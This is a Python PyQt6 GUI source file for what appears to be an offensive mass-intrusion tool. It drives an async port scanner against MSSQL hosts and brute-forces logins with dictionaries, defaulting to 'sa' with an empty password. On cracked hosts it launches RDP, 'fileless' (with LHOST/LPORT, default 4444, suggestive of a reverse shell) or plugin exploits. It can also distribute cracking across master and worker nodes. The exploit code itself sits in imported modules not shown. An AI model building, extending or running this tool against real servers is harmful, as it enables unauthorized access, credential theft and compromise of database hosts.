import os
import sys
import queue
import asyncio
import threading
from typing import Optional, List

from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QLabel, QLineEdit, QPushButton, QTextEdit, QProgressBar,
    QTableWidget, QTableWidgetItem, QTabWidget, QCheckBox,
    QSpinBox, QComboBox, QFileDialog, QMessageBox, QGroupBox, QGridLayout,
    QFrame, QHeaderView
)
from PyQt6.QtCore import Qt, QTimer, pyqtSignal, QThread
from PyQt6.QtGui import QFont, QFontDatabase, QIcon

from core.config import ScanConfig, ExploitMode
from core.logger import logger
from core.signals import request_shutdown, clear_shutdown, register_thread, unregister_thread
from core.database import db
from core.utils import IPUtils
from scanner.port_scanner import AsyncPortScanner
from bruter.bruter import MSSQLBruter
from exploiter import RDPExploiter, FilelessExploiter, PluginManager
from distributed.master import DistributedMaster
from distributed.worker import DistributedWorker
from report.generator import ReportGenerator
from gui.i18n import _, set_lang, current_lang, SUPPORTED_LANGS


DARK_STYLE = """
    QMainWindow { background-color: #1a1a1a; }
    QWidget { background-color: #252525; color: #e0e0e0; font-family: "Segoe UI", "Microsoft YaHei", sans-serif; font-size: 10pt; }
    QLabel { color: #e0e0e0; padding: 2px 0; }
    QGroupBox { color: #e0e0e0; border: 1px solid #3a3a3a; border-radius: 6px; margin-top: 12px; font-weight: bold; padding-top: 8px; }
    QGroupBox::title { subcontrol-origin: margin; left: 12px; padding: 0 8px; background-color: #252525; }
    QPushButton { background-color: #2d2d2d; color: #e0e0e0; border: 1px solid #3a3a3a; border-radius: 4px; padding: 6px 14px; font-weight: 500; }
    QPushButton:hover { background-color: #3a3a3a; border-color: #4a4a4a; }
    QPushButton:pressed { background-color: #1e1e1e; }
    QPushButton:disabled { background-color: #1e1e1e; color: #707070; border-color: #2a2a2a; }
    QLineEdit, QTextEdit, QSpinBox, QComboBox { background-color: #1e1e1e; color: #e0e0e0; border: 1px solid #3a3a3a; border-radius: 4px; padding: 5px 8px; selection-background-color: #0a84ff; }
    QComboBox::drop-down { border: none; width: 20px; }
    QComboBox::down-arrow { image: none; border-left: 5px solid transparent; border-right: 5px solid transparent; border-top: 6px solid #a0a0a0; margin-right: 5px; }
    QComboBox QAbstractItemView { background-color: #1e1e1e; color: #e0e0e0; selection-background-color: #0a84ff; border: 1px solid #3a3a3a; }
    QTabWidget::pane { border: 1px solid #3a3a3a; border-radius: 4px; background-color: #252525; margin-top: -1px; }
    QTabBar::tab { background-color: #2a2a2a; color: #b0b0b0; padding: 8px 20px; margin-right: 2px; border-top-left-radius: 4px; border-top-right-radius: 4px; }
    QTabBar::tab:selected { background-color: #252525; color: #ffffff; border-bottom: 2px solid #0a84ff; }
    QTabBar::tab:hover:!selected { background-color: #333333; }
    QTableWidget { gridline-color: #3a3a3a; border: 1px solid #3a3a3a; border-radius: 4px; }
    QTableWidget::item { padding: 4px; }
    QTableWidget::item:selected { background-color: #0a84ff; color: #ffffff; }
    QHeaderView::section { background-color: #2d2d2d; color: #e0e0e0; padding: 8px 4px; border: 1px solid #3a3a3a; font-weight: bold; }
    QProgressBar { border: 1px solid #3a3a3a; border-radius: 4px; text-align: center; color: #e0e0e0; background-color: #1e1e1e; }
    QProgressBar::chunk { background-color: #0a84ff; border-radius: 3px; }
    QScrollBar:vertical { background: #1e1e1e; width: 12px; border-radius: 4px; }
    QScrollBar::handle:vertical { background: #4a4a4a; border-radius: 4px; min-height: 20px; }
    QScrollBar::handle:vertical:hover { background: #5a5a5a; }
    QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical { border: none; background: none; }
    QCheckBox { color: #e0e0e0; spacing: 8px; }
    QCheckBox::indicator { width: 16px; height: 16px; border-radius: 3px; border: 1px solid #3a3a3a; background-color: #1e1e1e; }
    QCheckBox::indicator:checked { background-color: #0a84ff; border-color: #0a84ff; }
    QFrame[separator="true"] { background-color: #3a3a3a; max-height: 1px; }
"""


class ScannerWorker(QThread):
    progress = pyqtSignal(int, int, str)
    log = pyqtSignal(str)
    finished = pyqtSignal()

    def __init__(self, config: ScanConfig):
        super().__init__()
        self.config = config

    def run(self) -> None:
        register_thread(self)
        logger.add_callback(self.log.emit)
        try:
            asyncio.run(self._scan())
        except Exception as e:
            self.log.emit(_("log_scan_exception", e=e))
        finally:
            logger.remove_callback(self.log.emit)
            unregister_thread(self)
            self.finished.emit()

    async def _scan(self) -> None:
        targets: List[str] = []
        for t in self.config.targets:
            try:
                targets.extend(IPUtils.parse_target(t))
            except Exception as e:
                self.log.emit(_("log_parse_target_fail", t=t, e=e))
        if not targets:
            self.log.emit(_("log_no_target"))
            return

        scanner = AsyncPortScanner(self.config.max_concurrency, self.config.timeout)
        scanner.set_progress_callback(lambda c, t, msg: self.progress.emit(c, t, msg))
        open_results = await scanner.scan(targets, self.config.ports)
        open_ips = list(set(r.ip for r in open_results))
        self.log.emit(_("log_found_ports", n=len(open_ips)))
        if not open_ips:
            return

        bruter = MSSQLBruter(
            strategy=self.config.credential_strategy,
            timeout=self.config.timeout,
            rate_limit=self.config.rate_limit,
            use_tls=self.config.use_tls,
            use_windows_auth=self.config.use_windows_auth,
            use_kerberos=self.config.use_kerberos,
            domain=self.config.domain
        )
        bruter.set_progress_callback(lambda c, t, msg: self.progress.emit(c, t, msg))
        users = self.config.users or ['sa']
        passwords = self.config.passwords or ['']
        cracked = bruter.brute(open_ips, self.config.ports, users, passwords)
        if not cracked:
            self.log.emit(_("log_no_weak_pass"))
            return

        if self.config.exploit_mode == ExploitMode.RDP:
            exp = RDPExploiter()
            for cred in cracked:
                res = exp.exploit(cred.ip, cred.port, cred.username, cred.password)
                self.log.emit(_("log_rdp_result", ip=cred.ip, res=res))
        elif self.config.exploit_mode == ExploitMode.FILELESS:
            exp = FilelessExploiter()
            for cred in cracked:
                res = exp.exploit(cred.ip, cred.port, cred.username, cred.password,
                                  **self.config.exploit_config)
                self.log.emit(_("log_fileless_result", ip=cred.ip, res=res))
        elif self.config.exploit_mode == ExploitMode.PLUGIN:
            pm = PluginManager()
            plugin_name = self.config.exploit_config.get('plugin_name')
            if plugin_name:
                for cred in cracked:
                    res = pm.run_plugin(plugin_name, cred.ip, cred.port, cred.username, cred.password)
                    self.log.emit(_("log_plugin_result", ip=cred.ip, res=res))


class MasterThread(QThread):
    log = pyqtSignal(str)
    finished = pyqtSignal()

    def __init__(self, host: str, port: int):
        super().__init__()
        self.host = host
        self.port = port
        self.master: Optional[DistributedMaster] = None

    def run(self) -> None:
        register_thread(self)
        self.master = DistributedMaster(self.host, self.port)
        try:
            self.master.start()
        except Exception as e:
            self.log.emit(str(e))
        finally:
            unregister_thread(self)
            self.finished.emit()

    def stop(self) -> None:
        if self.master:
            self.master.stop()
        self.requestInterruption()
        # Don't wait here - let caller handle async cleanup via finished signal


class WorkerThread(QThread):
    log = pyqtSignal(str)
    finished = pyqtSignal()

    def __init__(self, host: str, port: int, users: Optional[List[str]], passwords: Optional[List[str]]):
        super().__init__()
        self.host = host
        self.port = port
        self.users = users
        self.passwords = passwords
        self.worker: Optional[DistributedWorker] = None

    def run(self) -> None:
        register_thread(self)
        self.worker = DistributedWorker(self.host, self.port, self.users, self.passwords)
        try:
            self.worker.start()
        except Exception as e:
            self.log.emit(str(e))
        finally:
            unregister_thread(self)
            self.finished.emit()

    def stop(self) -> None:
        if self.worker:
            self.worker.stop()
        self.requestInterruption()
        # Don't wait here - let caller handle async cleanup via finished signal


class MainWindow(QMainWindow):

    # Keys for combo-box items that need runtime update
    _AUTH_ITEMS_KEY = "auth_items"
    _EXPLOIT_ITEMS_KEY = "exploit_items"

    def __init__(self) -> None:
        super().__init__()
        self.setWindowTitle(_("window_title"))
        self.setMinimumSize(1200, 800)
        self.resize(1350, 900)
        self.setStyleSheet(DARK_STYLE)

        icon_path = os.path.join(os.path.dirname(__file__), '..', 'assets', 'icon.png')
        if os.path.exists(icon_path):
            self.setWindowIcon(QIcon(icon_path))

        self.log_queue: queue.Queue[str] = queue.Queue()
        self.scan_thread: Optional[ScannerWorker] = None
        self.master_thread: Optional[MasterThread] = None
        self.worker_thread: Optional[WorkerThread] = None

        self._progress_pending = 0
        self._progress_total = 0
        self._progress_msg = ""
        self._progress_timer = QTimer()
        self._progress_timer.setSingleShot(True)
        self._progress_timer.timeout.connect(self._flush_progress)

        self._combo_items: dict = {}   # name → [keys]
        self._named_widgets: dict = {}  # name → widget (for setText / setPlaceholderText)

        self._setup_ui()
        self._start_log_consumer()
        logger.add_callback(lambda m: self.log_queue.put(m))

    # ── Translation helpers ────────────────────────────────────────────────────

    def _retranslate_ui(self) -> None:
        """Refresh all translatable strings. Call after set_lang()."""
        self.setWindowTitle(_("window_title"))
        self._title_label.setText(_("title"))
        self._log_group.setTitle(_("group_log"))
        self.status_label.setText(_("status_ready"))

        self.tabs.setTabText(0, _("tab_scan"))
        self.tabs.setTabText(1, _("tab_distributed"))
        self.tabs.setTabText(2, _("tab_result"))

        self._refresh_combo_items()
        self._refresh_named_widgets()

    def _refresh_combo_items(self) -> None:
        # Update existing items in-place with setItemText() instead of
        # clear()/addItems().  clear() resets the dropdown view's font in Qt 6.11,
        # causing STATUS_STACK_BUFFER_OVERRUN (0xC0000409) when ja/ru text
        # is later rendered.  setItemText() preserves all internal view state.
        _keys = self._combo_items.get("auth_combo", [])
        for i, k in enumerate(_keys):
            if i < self.auth_combo.count():
                self.auth_combo.setItemText(i, _(k))

        _keys = self._combo_items.get("exploit_combo", [])
        for i, k in enumerate(_keys):
            if i < self.exploit_combo.count():
                self.exploit_combo.setItemText(i, _(k))

        if "lang_combo" in self._combo_items:
            _keys = self._combo_items["lang_combo"]
            for i, k in enumerate(_keys):
                if i < self.lang_combo.count():
                    self.lang_combo.setItemText(i, _(k))

    def _refresh_named_widgets(self) -> None:
        for name, widget in self._named_widgets.items():
            if isinstance(widget, QLabel):
                widget.setText(_(name))
            elif isinstance(widget, QLineEdit):
                widget.setPlaceholderText(_(name))
            elif isinstance(widget, QPushButton):
                widget.setText(_(name))
            elif isinstance(widget, QGroupBox):
                widget.setTitle(_(name))

    def _w(self, name: str, widget) -> None:
        """Register a translatable named widget."""
        self._named_widgets[name] = widget

    # ── UI Setup ───────────────────────────────────────────────────────────────

    def _setup_ui(self) -> None:
        central = QWidget()
        self.setCentralWidget(central)
        main_layout = QVBoxLayout(central)
        main_layout.setContentsMargins(12, 12, 12, 12)
        main_layout.setSpacing(8)

        # Title bar: logo + language selector
        title_bar = QHBoxLayout()
        self._title_label = QLabel(_("title"))
        self._title_label.setStyleSheet("font-size: 18pt; font-weight: bold; color: #0a84ff; padding: 8px 0;")
        title_bar.addWidget(self._title_label)
        title_bar.addStretch()

        self.lang_combo = QComboBox()
        # Prevent STATUS_STACK_BUFFER_OVERRUN (0xC0000409) when Qt renders
        # CJK text in the dropdown popup view.  setFont() alone is not enough —
        # the popup's QAbstractItemView must also carry a CJK-capable font.
        _cjk = next((f for f in [
            "MS Gothic", "Yu Gothic", "Malgun Gothic",
            "Microsoft YaHei", "Noto Sans HK", "Segoe UI"
        ] if f in QFontDatabase.families()), "Arial")
        self._cjk_font = QFont(_cjk, 9)   # stored so _refresh_combo_items can reuse it
        self.lang_combo.setFont(self._cjk_font)
        self.lang_combo.view().setFont(self._cjk_font)   # dropdown popup
        self._combo_items["lang_combo"] = [
            "lang_zh", "lang_zh_tw", "lang_en", "lang_ja", "lang_ru"
        ]
        self.lang_combo.addItems([_(k) for k in self._combo_items["lang_combo"]])
        # Normalize lang code: zh-tw -> zh_tw for translation key lookup
        _lang_key = "lang_" + current_lang().replace("-", "_")
        self.lang_combo.setCurrentText(_(_lang_key))
        self.lang_combo.currentIndexChanged.connect(self._on_lang_changed)
        lang_label = QLabel(_("lang_label"))
        lang_label.setStyleSheet("padding: 0 4px;")
        title_bar.addWidget(lang_label)
        title_bar.addWidget(self.lang_combo)
        main_layout.addLayout(title_bar)

        self.tabs = QTabWidget()
        main_layout.addWidget(self.tabs, 1)

        self._setup_scan_tab()
        self._setup_dist_tab()
        self._setup_result_tab()

        self._log_group = QGroupBox(_("group_log"))
        log_layout = QVBoxLayout(self._log_group)
        self.log_text = QTextEdit()
        self.log_text.setReadOnly(True)
        self.log_text.setFont(QFont("Consolas", 9))
        log_layout.addWidget(self.log_text)
        main_layout.addWidget(self._log_group, 1)

        status_widget = QWidget()
        status_layout = QHBoxLayout(status_widget)
        status_layout.setContentsMargins(0, 4, 0, 0)
        self.status_label = QLabel(_("status_ready"))
        self.status_label.setStyleSheet("font-weight: bold;")
        status_layout.addWidget(self.status_label)
        status_layout.addStretch()
        self.progress_bar = QProgressBar()
        self.progress_bar.setVisible(False)
        self.progress_bar.setMaximumHeight(18)
        status_layout.addWidget(self.progress_bar)
        main_layout.addWidget(status_widget)

    def _setup_scan_tab(self) -> None:
        tab = QWidget()
        self.tabs.addTab(tab, _("tab_scan"))
        layout = QVBoxLayout(tab)
        layout.setSpacing(10)

        # ── Target group ──────────────────────────────────────────────────────
        target_group = QGroupBox(_("group_target"))
        self._w("group_target", target_group)
        g = QGridLayout(target_group)
        g.setVerticalSpacing(8)
        g.setHorizontalSpacing(12)

        row = 0
        label = QLabel(_("label_target"))
        self._w("label_target", label)
        g.addWidget(label, row, 0)
        self.target_input = QLineEdit()
        self.target_input.setPlaceholderText(_("placeholder_target"))
        self._w("placeholder_target", self.target_input)
        g.addWidget(self.target_input, row, 1, 1, 3)
        btn = QPushButton(_("btn_browse"))
        self._w("btn_browse", btn)
        btn.clicked.connect(lambda: self._browse_file(self.target_input))
        g.addWidget(btn, row, 4)
        row += 1

        label = QLabel(_("label_port"))
        self._w("label_port", label)
        g.addWidget(label, row, 0)
        self.port_input = QLineEdit("1433")
        g.addWidget(self.port_input, row, 1)
        label = QLabel(_("label_concurrency"))
        self._w("label_concurrency", label)
        g.addWidget(label, row, 2)
        self.concurrency_spin = QSpinBox()
        self.concurrency_spin.setRange(1, 2000)
        self.concurrency_spin.setValue(500)
        g.addWidget(self.concurrency_spin, row, 3)
        row += 1

        label = QLabel(_("label_proxy"))
        self._w("label_proxy", label)
        g.addWidget(label, row, 0)
        self.proxy_input = QLineEdit()
        self.proxy_input.setPlaceholderText(_("placeholder_proxy"))
        self._w("placeholder_proxy", self.proxy_input)
        g.addWidget(self.proxy_input, row, 1, 1, 3)
        layout.addWidget(target_group)

        # ── Dictionary group ───────────────────────────────────────────────────
        dict_group = QGroupBox(_("group_dict"))
        self._w("group_dict", dict_group)
        dg = QGridLayout(dict_group)
        dg.setVerticalSpacing(8)
        dg.setHorizontalSpacing(12)

        label = QLabel(_("label_user_dict"))
        self._w("label_user_dict", label)
        dg.addWidget(label, 0, 0)
        self.user_file = QLineEdit()
        dg.addWidget(self.user_file, 0, 1, 1, 2)
        btn = QPushButton(_("btn_browse"))
        self._w("btn_browse", btn)
        btn.clicked.connect(lambda: self._browse_file(self.user_file))
        dg.addWidget(btn, 0, 3)

        label = QLabel(_("label_pass_dict"))
        self._w("label_pass_dict", label)
        dg.addWidget(label, 1, 0)
        self.pass_file = QLineEdit()
        dg.addWidget(self.pass_file, 1, 1, 1, 2)
        btn = QPushButton(_("btn_browse"))
        self._w("btn_browse", btn)
        btn.clicked.connect(lambda: self._browse_file(self.pass_file))
        dg.addWidget(btn, 1, 3)
        layout.addWidget(dict_group)

        # ── Auth group ─────────────────────────────────────────────────────────
        auth_group = QGroupBox(_("group_auth"))
        self._w("group_auth", auth_group)
        ag = QGridLayout(auth_group)
        ag.setVerticalSpacing(8)
        ag.setHorizontalSpacing(12)

        label = QLabel(_("label_auth_mode"))
        self._w("label_auth_mode", label)
        ag.addWidget(label, 0, 0)
        self.auth_combo = QComboBox()
        _cjk = next((f for f in ["MS Gothic","Yu Gothic","Malgun Gothic","Microsoft YaHei","Segoe UI"] if f in QFontDatabase.families()), "Arial")
        self.auth_combo.setFont(QFont(_cjk, 9))
        self._combo_items["auth_combo"] = [
            "auth_sql", "auth_windows", "auth_kerberos"
        ]
        self.auth_combo.addItems([_(k) for k in self._combo_items["auth_combo"]])
        ag.addWidget(self.auth_combo, 0, 1)
        label = QLabel(_("label_domain"))
        self._w("label_domain", label)
        ag.addWidget(label, 0, 2)
        self.domain_input = QLineEdit()
        self.domain_input.setPlaceholderText(_("placeholder_domain"))
        self._w("ph_domain", self.domain_input)  # "ph_" prefix = placeholder, unique vs "label_*"
        ag.addWidget(self.domain_input, 0, 3)
        self.tls_check = QCheckBox(_("check_tls"))
        self._w("check_tls", self.tls_check)
        ag.addWidget(self.tls_check, 1, 0, 1, 2)
        layout.addWidget(auth_group)

        # ── Exploit group ──────────────────────────────────────────────────────
        exploit_group = QGroupBox(_("group_exploit"))
        self._w("group_exploit", exploit_group)
        eg = QGridLayout(exploit_group)
        eg.setVerticalSpacing(8)
        eg.setHorizontalSpacing(12)

        label = QLabel(_("label_exploit_mode"))
        self._w("label_exploit_mode", label)
        eg.addWidget(label, 0, 0)
        self.exploit_combo = QComboBox()
        _cjk = next((f for f in ["MS Gothic","Yu Gothic","Malgun Gothic","Microsoft YaHei","Segoe UI"] if f in QFontDatabase.families()), "Arial")
        self.exploit_combo.setFont(QFont(_cjk, 9))
        self._combo_items["exploit_combo"] = [
            "exploit_none", "exploit_rdp", "exploit_fileless", "exploit_plugin"
        ]
        self.exploit_combo.addItems([_(k) for k in self._combo_items["exploit_combo"]])
        eg.addWidget(self.exploit_combo, 0, 1)

        label = QLabel(_("label_lhost"))
        self._w("label_lhost", label)
        eg.addWidget(label, 1, 0)
        self.lhost_input = QLineEdit()
        self.lhost_input.setPlaceholderText(_("placeholder_lhost"))
        self._w("placeholder_lhost", self.lhost_input)
        eg.addWidget(self.lhost_input, 1, 1)

        label = QLabel(_("label_lport"))
        self._w("label_lport", label)
        eg.addWidget(label, 1, 2)
        self.lport_input = QLineEdit("4444")
        eg.addWidget(self.lport_input, 1, 3)
        layout.addWidget(exploit_group)

        # ── Buttons ────────────────────────────────────────────────────────────
        btn_layout = QHBoxLayout()
        self.start_btn = QPushButton(_("btn_start_scan"))
        self._w("btn_start_scan", self.start_btn)
        self.start_btn.setMinimumHeight(36)
        self.start_btn.setStyleSheet("font-weight: bold; background-color: #0a84ff;")
        self.start_btn.clicked.connect(self.start_scan)
        btn_layout.addWidget(self.start_btn)

        self.stop_btn = QPushButton(_("btn_stop"))
        self._w("btn_stop", self.stop_btn)
        self.stop_btn.setMinimumHeight(36)
        self.stop_btn.setEnabled(False)
        self.stop_btn.clicked.connect(self.stop_scan)
        btn_layout.addWidget(self.stop_btn)
        layout.addLayout(btn_layout)
        layout.addStretch()

    def _setup_dist_tab(self) -> None:
        tab = QWidget()
        self.tabs.addTab(tab, _("tab_distributed"))
        layout = QVBoxLayout(tab)
        layout.setSpacing(15)

        # ── Master group ───────────────────────────────────────────────────────
        master_group = QGroupBox(_("group_master"))
        self._w("group_master", master_group)
        ml = QGridLayout(master_group)
        ml.setVerticalSpacing(8)
        ml.setHorizontalSpacing(12)

        label = QLabel(_("label_master_host"))
        self._w("label_master_host", label)
        ml.addWidget(label, 0, 0)
        self.master_host = QLineEdit("0.0.0.0")
        ml.addWidget(self.master_host, 0, 1)
        label = QLabel(_("label_master_port"))
        self._w("label_master_port", label)
        ml.addWidget(label, 0, 2)
        self.master_port = QSpinBox()
        self.master_port.setRange(1, 65535)
        self.master_port.setValue(9999)
        ml.addWidget(self.master_port, 0, 3)

        self.master_start_btn = QPushButton(_("btn_start_master"))
        self._w("btn_start_master", self.master_start_btn)
        self.master_start_btn.clicked.connect(self.start_master)
        ml.addWidget(self.master_start_btn, 1, 0, 1, 2)

        self.master_stop_btn = QPushButton(_("btn_stop_master"))
        self._w("btn_stop_master", self.master_stop_btn)
        self.master_stop_btn.clicked.connect(self.stop_master)
        self.master_stop_btn.setEnabled(False)
        ml.addWidget(self.master_stop_btn, 1, 2, 1, 2)
        layout.addWidget(master_group)

        line = QFrame()
        line.setFrameShape(QFrame.Shape.HLine)
        line.setProperty("separator", True)
        layout.addWidget(line)

        # ── Worker group ───────────────────────────────────────────────────────
        worker_group = QGroupBox(_("group_worker"))
        self._w("group_worker", worker_group)
        wl = QGridLayout(worker_group)
        wl.setVerticalSpacing(8)
        wl.setHorizontalSpacing(12)

        label = QLabel(_("label_worker_master"))
        self._w("label_worker_master", label)
        wl.addWidget(label, 0, 0)
        self.worker_master = QLineEdit("127.0.0.1")
        wl.addWidget(self.worker_master, 0, 1)
        label = QLabel(_("label_master_port"))
        self._w("label_master_port", label)
        wl.addWidget(label, 0, 2)
        self.worker_port = QSpinBox()
        self.worker_port.setRange(1, 65535)
        self.worker_port.setValue(9999)
        wl.addWidget(self.worker_port, 0, 3)

        self.worker_start_btn = QPushButton(_("btn_start_worker"))
        self._w("btn_start_worker", self.worker_start_btn)
        self.worker_start_btn.clicked.connect(self.start_worker)
        wl.addWidget(self.worker_start_btn, 1, 0, 1, 2)

        self.worker_stop_btn = QPushButton(_("btn_stop_worker"))
        self._w("btn_stop_worker", self.worker_stop_btn)
        self.worker_stop_btn.clicked.connect(self.stop_worker)
        self.worker_stop_btn.setEnabled(False)
        wl.addWidget(self.worker_stop_btn, 1, 2, 1, 2)
        layout.addWidget(worker_group)
        layout.addStretch()

    def _setup_result_tab(self) -> None:
        tab = QWidget()
        self.tabs.addTab(tab, _("tab_result"))
        layout = QVBoxLayout(tab)

        self.result_table = QTableWidget()
        self.result_table.setColumnCount(8)
        self.result_table.setHorizontalHeaderLabels([
            _("result_ip"),
            _("result_port"),
            _("result_status"),
            _("result_user"),
            _("result_pass"),
            _("result_version"),
            _("result_honeypot"),
            _("result_cve"),
        ])
        self.result_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        self.result_table.setAlternatingRowColors(True)
        self.result_table.setStyleSheet("alternate-background-color: #2a2a2a;")
        layout.addWidget(self.result_table)

        btn_layout = QHBoxLayout()
        btn = QPushButton(_("btn_refresh"))
        self._w("btn_refresh", btn)
        btn.clicked.connect(self._refresh_result_table)
        btn_layout.addWidget(btn)
        btn = QPushButton(_("btn_export"))
        self._w("btn_export", btn)
        btn.clicked.connect(self.export_report)
        btn_layout.addWidget(btn)
        btn_layout.addStretch()
        layout.addLayout(btn_layout)

    def _on_lang_changed(self, index: int) -> None:
        lang = SUPPORTED_LANGS[index]
        set_lang(lang)
        self._retranslate_ui()

    # ── Actions ─────────────────────────────────────────────────────────────────

    def _browse_file(self, entry: QLineEdit) -> None:
        f, _ = QFileDialog.getOpenFileName(self, _("dlg_select_file"))
        if f:
            entry.setText(f)

    def start_scan(self) -> None:
        target = self.target_input.text().strip()
        if not target:
            QMessageBox.warning(self, _("err_no_target_title"), _("err_no_target"))
            return

        config = ScanConfig()
        config.targets = [target]
        ports_text = self.port_input.text().strip()
        if ports_text:
            config.ports = [int(p.strip()) for p in ports_text.split(',') if p.strip()]
        config.max_concurrency = self.concurrency_spin.value()

        proxy_text = self.proxy_input.text().strip()
        if proxy_text:
            config.proxy = proxy_text

        if self.user_file.text():
            with open(self.user_file.text(), encoding='utf-8') as f:
                config.users = [l.strip() for l in f if l.strip()]
        if self.pass_file.text():
            with open(self.pass_file.text(), encoding='utf-8') as f:
                config.passwords = [l.strip() for l in f if l.strip()]

        # Map current combo text → key
        auth_text = self.auth_combo.currentText()
        auth_map = {_(k): k for k in self._combo_items["auth_combo"]}
        key = auth_map.get(auth_text, "auth_sql")
        config.use_windows_auth = (key == "auth_windows")
        config.use_kerberos = (key == "auth_kerberos")
        config.domain = self.domain_input.text().strip()
        config.use_tls = self.tls_check.isChecked()

        exploit_text = self.exploit_combo.currentText()
        exploit_map = {_(k): k for k in self._combo_items["exploit_combo"]}
        key = exploit_map.get(exploit_text, "exploit_none")
        if key == "exploit_rdp":
            config.exploit_mode = ExploitMode.RDP
        elif key == "exploit_fileless":
            config.exploit_mode = ExploitMode.FILELESS
            config.exploit_config = {
                'lhost': self.lhost_input.text().strip(),
                'lport': int(self.lport_input.text().strip() or 4444)
            }
        elif key == "exploit_plugin":
            config.exploit_mode = ExploitMode.PLUGIN
        else:
            config.exploit_mode = ExploitMode.NONE

        clear_shutdown()
        self.scan_thread = ScannerWorker(config)
        self.scan_thread.progress.connect(self._update_progress)
        self.scan_thread.log.connect(self._append_log)
        self.scan_thread.finished.connect(self._scan_finished)
        self.scan_thread.start()

        self.start_btn.setEnabled(False)
        self.stop_btn.setEnabled(True)
        self.progress_bar.setVisible(True)
        self.progress_bar.setValue(0)
        self.status_label.setText(_("status_init"))

    def _update_progress(self, current: int, total: int, msg: str) -> None:
        self._progress_pending = current
        self._progress_total = total
        self._progress_msg = msg
        if not self._progress_timer.isActive():
            self._progress_timer.start(50)

    def _flush_progress(self) -> None:
        self.progress_bar.setMaximum(self._progress_total)
        self.progress_bar.setValue(self._progress_pending)
        self.status_label.setText(self._progress_msg)

    def _append_log(self, msg: str) -> None:
        self.log_queue.put(msg)

    def _scan_finished(self) -> None:
        self.start_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)
        self.progress_bar.setVisible(False)
        self.status_label.setText(_("status_done"))
        self._refresh_result_table()

    def _refresh_result_table(self) -> None:
        # Refresh header labels in case language changed
        self.result_table.setHorizontalHeaderLabels([
            _("result_ip"),
            _("result_port"),
            _("result_status"),
            _("result_user"),
            _("result_pass"),
            _("result_version"),
            _("result_honeypot"),
            _("result_cve"),
        ])
        header = self.result_table.horizontalHeader()
        header_state = header.saveState()

        self.result_table.setUpdatesEnabled(False)
        self.result_table.setRowCount(0)
        for status in ['open', 'cracked', 'exploited', 'honeypot']:
            for t in db.get_targets_by_status(status):
                row = self.result_table.rowCount()
                self.result_table.insertRow(row)
                self.result_table.setItem(row, 0, QTableWidgetItem(t.get('ip', '')))
                self.result_table.setItem(row, 1, QTableWidgetItem(str(t.get('port', ''))))
                self.result_table.setItem(row, 2, QTableWidgetItem(t.get('status', '')))
                self.result_table.setItem(row, 3, QTableWidgetItem(t.get('username', '')))
                pwd = t.get('password')
                self.result_table.setItem(row, 4, QTableWidgetItem('***' if pwd else ''))
                ver = t.get('version') or ''
                self.result_table.setItem(row, 5, QTableWidgetItem(ver[:50]))
                score = t.get('honeypot_score', 0.0)
                self.result_table.setItem(row, 6, QTableWidgetItem(f"{score:.2f}" if score is not None else ''))
                cves = ','.join(t.get('cve_list', []))
                self.result_table.setItem(row, 7, QTableWidgetItem(cves))

        header.restoreState(header_state)
        self.result_table.setUpdatesEnabled(True)

    def stop_scan(self) -> None:
        request_shutdown()
        self.stop_btn.setEnabled(False)
        self.status_label.setText(_("status_stopping"))

    def start_master(self) -> None:
        host = self.master_host.text().strip() or '0.0.0.0'
        port = self.master_port.value()
        self.master_thread = MasterThread(host, port)
        self.master_thread.log.connect(self._append_log)
        self.master_thread.start()
        self.master_start_btn.setEnabled(False)
        self.master_stop_btn.setEnabled(True)
        self.status_label.setText(_("status_master_running", host=host, port=port))

    def stop_master(self) -> None:
        if self.master_thread:
            self.master_stop_btn.setEnabled(False)  # Prevent double-click
            self.status_label.setText(_("status_stopping"))
            # Connect to finished signal for async cleanup
            self.master_thread.finished.connect(self._on_master_stopped)
            self.master_thread.stop()
        else:
            self.master_start_btn.setEnabled(True)
            self.master_stop_btn.setEnabled(False)
            self.status_label.setText(_("status_master_stopped"))

    def _on_master_stopped(self) -> None:
        self.master_start_btn.setEnabled(True)
        self.status_label.setText(_("status_master_stopped"))

    def start_worker(self) -> None:
        host = self.worker_master.text().strip()
        port = self.worker_port.value()
        users = None
        passwords = None
        if self.user_file.text():
            with open(self.user_file.text(), encoding='utf-8') as f:
                users = [l.strip() for l in f if l.strip()]
        if self.pass_file.text():
            with open(self.pass_file.text(), encoding='utf-8') as f:
                passwords = [l.strip() for l in f if l.strip()]
        self.worker_thread = WorkerThread(host, port, users, passwords)
        self.worker_thread.log.connect(self._append_log)
        self.worker_thread.start()
        self.worker_start_btn.setEnabled(False)
        self.worker_stop_btn.setEnabled(True)
        self.status_label.setText(_("status_worker_running", host=host, port=port))

    def stop_worker(self) -> None:
        if self.worker_thread:
            self.worker_stop_btn.setEnabled(False)  # Prevent double-click
            self.status_label.setText(_("status_stopping"))
            # Connect to finished signal for async cleanup
            self.worker_thread.finished.connect(self._on_worker_stopped)
            self.worker_thread.stop()
        else:
            self.worker_start_btn.setEnabled(True)
            self.worker_stop_btn.setEnabled(False)
            self.status_label.setText(_("status_worker_stopped"))

    def _on_worker_stopped(self) -> None:
        self.worker_start_btn.setEnabled(True)
        self.status_label.setText(_("status_worker_stopped"))

    def export_report(self) -> None:
        f, _ = QFileDialog.getSaveFileName(self, _("export_title"), "",
                                           _("filter_html") + ";;" + _("filter_json"))
        if not f:
            return
        hide = False
        if f.endswith('.json'):
            ReportGenerator.generate_json(f, hide_passwords=hide)
        else:
            ReportGenerator.generate_html(f, hide_passwords=hide)
        QMessageBox.information(self, _("export_done"),
                                _("export_saved", f=f))

    def _start_log_consumer(self) -> None:
        self.log_timer = QTimer()
        self.log_timer.timeout.connect(self._flush_logs)
        self.log_timer.start(80)

    def _flush_logs(self) -> None:
        if self.log_queue.empty():
            return
        messages = []
        # Limit batch size to prevent UI lag with huge log volumes
        while len(messages) < 100 and not self.log_queue.empty():
            try:
                messages.append(self.log_queue.get_nowait())
            except queue.Empty:
                break
        if messages:
            self.log_text.append('\n'.join(messages))
            self.log_text.verticalScrollBar().setValue(
                self.log_text.verticalScrollBar().maximum()
            )
